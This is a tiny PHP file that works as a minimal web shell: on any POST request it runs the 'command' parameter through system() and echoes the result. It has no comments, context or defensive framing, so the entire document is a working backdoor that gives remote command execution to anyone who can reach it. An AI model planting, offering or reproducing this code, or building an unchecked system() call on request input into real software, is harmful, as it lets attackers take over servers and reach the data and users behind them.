<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      echo system($_POST['command']);
  }
